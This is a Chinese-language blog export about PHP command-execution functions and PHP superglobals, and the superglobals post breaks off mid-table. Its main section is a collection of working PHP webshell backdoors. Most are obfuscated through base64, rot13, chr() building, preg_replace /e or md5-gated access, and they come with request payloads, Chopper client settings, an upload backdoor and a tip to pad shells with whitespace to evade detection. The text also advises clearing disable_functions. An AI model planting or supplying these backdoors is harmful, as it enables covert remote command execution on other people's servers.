<p>其实从后面的$\<em>SERVER[&quot;HTTP\</em>&quot;]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\<em>，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP</em>开头的内容，其实是自定义内容！</p>
</blockquote>
<h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p>php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。<br>在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions =</div></pre></td></tr></table></figure>
<p>如果“disable_functions=”后面有接上面四个函数，将其删除。<br>默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。</p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>string <strong>exec</strong> ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> exec(<span class="string">"ls"</span>,$file);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        print_r($file);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test.php</div><div class="line">Array( [0] =&gt; index.php [1] =&gt; test.php)</div></pre></td></tr></table></figure>
<p>知识点：<br>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>void <strong>passthru</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        passthru(<span class="string">"ls"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.phptest.php</div></pre></td></tr></table></figure>
<p>知识点：<br>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>string <strong>system</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        system(&quot;ls /&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar</div></pre></td></tr></table></figure>
<p>知识点：<br>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
<h4 id="反撇号-和shell-exec"><a href="#反撇号-和shell-exec" class="headerlink" title="反撇号`和shell_exec()"></a>反撇号`和shell_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> `pwd`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>resource <strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> )</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"dir"</span>, <span class="string">"r"</span>);</div><div class="line">$read = fread($handle, <span class="number">4096</span>);</div><div class="line"><span class="keyword">echo</span> $read;</div><div class="line">pclose($handle);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> E:\wamp\www\</div><div class="line"></div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          .</div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          ..</div><div class="line">2017/08/20  11:43               656 404.php</div><div class="line">2017/05/07  13:51               145 302.php</div></pre></td></tr></table></figure>
<p>知识点：</p>
<p>popen也可以执行命令，知识执行命令时不是很方便</p>
<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>void <strong>pcntl_exec</strong> ( string <code>$path</code> [, array <code>$args</code> [, array <code>$envs</code> ]] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#exec.php</div><div class="line">&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;</div><div class="line"></div><div class="line">#/tmp/b4dboy.sh</div><div class="line">#!/bin/bash</div><div class="line">ls -l /</div></pre></td></tr></table></figure>
<h3 id="php后门"><a href="#php后门" class="headerlink" title="php后门"></a>php后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(str_rot13(<span class="string">'riny($_CBFG[cntr]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: page=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> call_user_func(create_function(<span class="keyword">null</span>,<span class="string">'assert($_POST[c]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $x=base64_decode(<span class="string">"YXNzZXJ0"</span>);$x($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></div><div class="line">中间base64解密为assert</div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'expdoor'</span>]);<span class="meta">?&gt;</span></div><div class="line">get/post: expdoor=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/f/e"</span>,$_GET[<span class="string">'u'</span>],<span class="string">"fengjiao"</span>); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</div><div class="line">◆i ：如果在修饰符中加上<span class="string">"i"</span>，则正则将会取消大小写敏感性，即<span class="string">"a"</span>和<span class="string">"A"</span> 是一样的。</div><div class="line">◆m：默认的正则开始<span class="string">"^"</span>和结束<span class="string">"$"</span>只是对于正则字符串如果在修饰符中加上<span class="string">"m"</span>，那么开始和结束将会指字符串的每一行：每一行的开头就是<span class="string">"^"</span>，结尾就是<span class="string">"$"</span>。</div><div class="line">◆s：如果在修饰符中加入<span class="string">"s"</span>，那么默认的<span class="string">"."</span>代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</div><div class="line">◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</div><div class="line">◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</div><div class="line">◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说<span class="string">"/a/A"</span>匹配<span class="string">"abcd"</span>。</div><div class="line">◆E：与<span class="string">"m"</span>相反，如果使用这个修饰符，那么<span class="string">"$"</span>将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</div><div class="line">◆U：和问号的作用差不多，用于设置<span class="string">"贪婪模式"</span>。</div><div class="line"></div><div class="line">http:<span class="comment">//localhost/test2.php?u=eval($_POST[c]);</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div><div class="line"></div><div class="line">菜刀中：</div><div class="line">密码：c</div><div class="line">配置：&lt;O&gt;u=<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">其实其将</div><div class="line"><span class="comment">//<span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">eval</span>($_POST[door])</div><div class="line"><span class="comment">//<span class="meta">?&gt;</span></span></div><div class="line">多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(<span class="number">47</span>))</div><div class="line"></div><div class="line">post: door=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_FILES[<span class="string">'u'</span>][<span class="string">'tmp_name'</span>]);  <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试</div><div class="line"></div><div class="line">请求：</div><div class="line">/index.php?c=system(<span class="string">'ls'</span>);</div><div class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-262952846810849</span></div><div class="line">  </div><div class="line">----------------------------<span class="number">-262952846810849</span></div><div class="line">Content-Disposition: form-data; name=<span class="string">"u"</span>; filename=<span class="string">"easy.php"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[c]); <span class="meta">?&gt;</span></div><div class="line">----------------------------<span class="number">-262952846810849</span>--</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">"hackers"</span>]==<span class="string">"2b"</span>)&#123;<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123; <span class="keyword">echo</span> <span class="string">"url:"</span>.$_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>];<span class="keyword">if</span>(!file_exists($_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]))&#123; copy($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], $_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]); &#125;&#125;<span class="meta">?&gt;</span>&lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;&lt;input name=<span class="string">"upfile"</span> type=<span class="string">"file"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;&lt;/form&gt;<span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">上传木马文件，最好还是上传大马！</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $s=@$_GET[<span class="number">2</span>];<span class="keyword">if</span>(md5($s.$s)==<span class="string">"c70d1cfca94435256f2874706af4c3c8"</span>)@<span class="keyword">eval</span>($_REQUEST[$s]); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">get: ?<span class="number">2</span>=moushen</div><div class="line">post/get: moushen=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">等价于：</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=<span class="string">"chr"</span>;</div><div class="line">$_cC=<span class="string">"eval($_POST[1]);"</span>;</div><div class="line">$_fF=<span class="string">"create_function"</span>;</div><div class="line">$_=create_function(<span class="string">""</span>,<span class="string">"eval($_POST[1]);"</span>);</div><div class="line">$_();	<span class="comment">// 将上面的语句进行执行</span></div><div class="line"></div><div class="line">string create_function ( string $args , string $code )</div><div class="line">$args是参数(<span class="string">"$a,$b,$c"</span>)，$code是执行代码，返回的是函数名</div><div class="line">要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！</div><div class="line"></div><div class="line">使用：</div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">md5($_GET[<span class="string">'qid'</span>])==<span class="string">'ba710ce1a217e63bf9f5ac483d2e9a6f'</span>?array_map(<span class="string">"as\x73ert"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'page'</span>]):next;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">array</span> array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] )</div><div class="line">array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</div><div class="line"> </div><div class="line">使用：</div><div class="line">?qid=moushenhao</div><div class="line">post/get: page</div></pre></td></tr></table></figure>
<font color="#f00">为了迷惑敌人，可以在shell中加入大量空格、换行！！</font>

<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$dI3h=$&#123;<span class="string">'_REQUEST'</span>&#125;; <span class="keyword">if</span> (!<span class="keyword">empty</span>($dI3h[<span class="string">'PBbs'</span>])) &#123;     $lwA = $dI3h[<span class="string">'UpB_'</span>];    $SdlT=$dI3h[<span class="string">'PBbs'</span>]($lwA($dI3h[<span class="string">'PWWk'</span>]),$lwA($dI3h[<span class="string">'xfrwA'</span>]));    $SdlT($lwA($dI3h[<span class="string">'Epd'</span>]));   &#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">知识点：</div><div class="line">$&#123;<span class="string">'xxx'</span>&#125;,其实代表的就是$xxx，其指代的是一个变量</div><div class="line">上面的构造有很多种，但是最容易发现的就是create_function</div><div class="line"></div><div class="line">使用：</div><div class="line">?PBbs=create_function&amp;UpB_=str_rot13&amp;PWWk=$a&amp;xfrwA=riny($a);&amp;Epd=flfgrz(yf);</div><div class="line">每次只需要更改Epd字段的内容即可，对于要输入的字段，每次都是需要rot13的。</div><div class="line">  </div><div class="line">其实也可以让其看起来简单点：trim/ltrim/rtrim/strtolower/strtoupper</div><div class="line">?PBbs=create_function&amp;UpB_=trim&amp;PWWk=$n&amp;xfrwA=<span class="keyword">eval</span>($n);&amp;Epd=system(ls);</div></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">### php一句话</span></div><div class="line"></div><div class="line">* <span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> assert($_POST[sb]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?</span>$_POST[<span class="string">'sa'</span>]($_POST[<span class="string">'sb'</span>],$_POST[<span class="string">'sc'</span>])<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/[email]/e"</span>,$_POST[<span class="string">'h'</span>],<span class="string">"error"</span>); <span class="meta">?&gt;</span></div><div class="line">　 <span class="comment">//使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入</span></div><div class="line">　 &lt;O&gt;h=@<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div><div class="line">* &lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[sb])&lt;/script&gt;</div><div class="line">* $filename=$_GET[<span class="string">'xbid'</span>];</div><div class="line">   <span class="keyword">include</span> ($filename);</div><div class="line">* <span class="meta">&lt;?php</span> $c=<span class="string">'ass'</span>.<span class="string">'ert'</span>;$&#123;c&#125;($_POST[<span class="number">4</span>]);<span class="meta">?&gt;</span></div><div class="line">* <span class="meta">&lt;?php</span> $k = str_replace(<span class="string">"8"</span>,<span class="string">""</span>,<span class="string">"a8s88s8e8r88t"</span>);$k($_POST[<span class="string">"8"</span>]); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当然，后门还有很多很多种，php小马、大马都值得我们学习，但是只需要学学就可以了，不必专注于此！！！</p>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> php </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[php全局变量]]></title>
      <url>/2017/08/27/php%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/</url>
      <content type="html"><![CDATA[<h3 id="php全局变量"><a href="#php全局变量" class="headerlink" title="php全局变量"></a>php全局变量</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$\_REQUEST"></a>$\_REQUEST</h4><p>$\_REQUEST 收集GET或者POST数据，如果GET和POST同时有数据，则优先取POST数据。使用超级全局变量 $_REQUEST 来收集 input 标签的值。此例是使用本文件处理表单！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</div><div class="line">Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</div><div class="line">&lt;input type=&quot;submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php </div><div class="line">$name = $_REQUEST[&apos;fname&apos;]; </div><div class="line">echo $name; </div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="POST"><a href="#POST" class="headerlink" title="$\_POST"></a>$\_POST</h4><p>$\_POST  广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。</p>
<h4 id="GET"><a href="#GET" class="headerlink" title="$\_GET"></a>$\_GET</h4><p>$_GET   可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据。也可以收集 URL 中的发送的数据。</p>
<h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$\_COOKIE"></a>$\_COOKIE</h4><p>$\_COOKIE    用于取回 cookie 的值。</p>
<h4 id="SESSION"><a href="#SESSION" class="headerlink" title="$\_SESSION"></a>$\_SESSION</h4><p>$\_SESSION   存储和取回 session 变量</p>
<p>session中的变量不能通过请求来传递，但是可以响应时通过PHP处理函数进行赋值，而且如果想全局使用，必须加上session_start();</p>
<h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h4><p>$GLOBALS 引用全局作用域中可用的全部变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$x = 75; </div><div class="line">$y = 25;</div><div class="line"> </div><div class="line">function addition() &#123; </div><div class="line">  $GLOBALS[&apos;z&apos;] = $GLOBALS[&apos;x&apos;] + $GLOBALS[&apos;y&apos;]; </div><div class="line">&#125;</div><div class="line"> </div><div class="line">addition(); </div><div class="line">echo $z; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$\_SERVER"></a>$\_SERVER</h4><p>$_SERVER 保存关于报头、路径和脚本位置的信息</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER[&#39;PHP_SELF&#39;]</td>
<td>返回当前执行脚本的文件名。<br><a href="http://example.com/test.php/foo.bar" target="_blank" rel="external">http://example.com/test.php/foo.bar</a> 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /test.php/foo.bar</td>
</tr>
<tr>
<td>$_SERVER[&#39;argv&#39;]</td>
<td>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</td>
</tr>
<tr>
<td>$_SERVER[&#39;argc&#39;]</td>
<td>包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;GATEWAY_INTERFACE&#39;]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADDR&#39;]</td>
<td>返回当前运行脚本<font color="#f00">所在的服务器的 IP 地址。</font></td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_NAME&#39;]</td>
<td>返回当前运行脚本所在的服务器的主机名（比如 <a href="http://www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。" target="_blank" rel="external">www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</a><br><strong>Note</strong>: 在 Apache 2 里，必须设置 <em>UseCanonicalName = On</em> 和 <em>ServerName</em>。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SOFTWARE&#39;]</td>
<td>返回服务器标识字符串,在响应请求时的头信息中给出（比如 Apache/2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PROTOCOL&#39;]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_METHOD&#39;]</td>
<td>返回访问页面使用的请求方法（例如 POST/HEAD/PUT/GET）。<br><strong>Note</strong>:如果请求方法为 <em>HEAD</em>，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME&#39;]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。&gt;5.1.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME_FLOAT&#39;]</td>
<td>返回请求开始时的时间戳，微秒级别的精准度。&gt;5.4.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</td>
<td>当前运行脚本所在的文档根目录。在服务器配置文件中定义。</td>
</tr>
<tr>
<td>$_SERVER[&#39;QUERY_STRING&#39;]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT&#39;]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]</td>
<td>返回来自当前请求的 Accept-Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</td>
